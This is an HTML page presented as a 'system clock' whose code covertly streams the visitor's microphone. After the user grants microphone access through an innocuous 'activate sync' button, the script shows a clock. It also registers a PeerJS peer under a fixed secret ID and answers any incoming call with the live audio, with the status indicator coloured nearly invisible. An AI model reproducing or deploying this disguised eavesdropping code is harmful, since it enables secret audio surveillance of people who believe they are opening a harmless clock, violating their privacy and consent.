<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>系统时钟</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #004400; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #clock { font-size: 3rem; text-shadow: 0 0 10px #002200; }
        #start-btn { padding: 20px 40px; font-size: 1.2rem; background: #050505; color: #008800; border: 1px solid #004400; border-radius: 8px; cursor: pointer; }
        #status { margin-top: 20px; font-size: 0.8rem; color: #111; }
    </style>
</head>
<body>
    <button id="start-btn" onclick="startAudio()">[ 激活同步系统 ]</button>
    <div id="clock" style="display:none;">00:00:00</div>
    <div id="status">OFFLINE</div>

    <script>
        const myID = 'my_secret_mic_8899'; // 唯一ID

        async function startAudio() {
            const statusTag = document.getElementById('status');
            try {
                // 请求麦克风权限
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                
                document.getElementById('start-btn').style.display = 'none';
                document.getElementById('clock').style.display = 'block';

                // 国内网络优化配置
                const peer = new Peer(myID, {
                    config: { 'iceServers': [
                        { urls: 'stun:stun.anyfirewall.com:3478' },
                        { urls: 'stun:stun.stunprotocol.org:3478' },
                        { urls: 'stun:stun.voiparound.com:3478' }
                    ]}
                });

                peer.on('open', () => {
                    statusTag.innerText = "ONLINE";
                    statusTag.style.color = "#013220";
                });

                peer.on('call', (call) => {
                    console.log("音频传输中...");
                    call.answer(stream);
                });

                // 时钟循环
                setInterval(() => {
                    document.getElementById('clock').innerText = new Date().toLocaleTimeString();
                }, 1000);

            } catch (err) {
                alert("无法开启麦克风，请检查权限设置");
            }
        }
    </script>
</body>
</html>
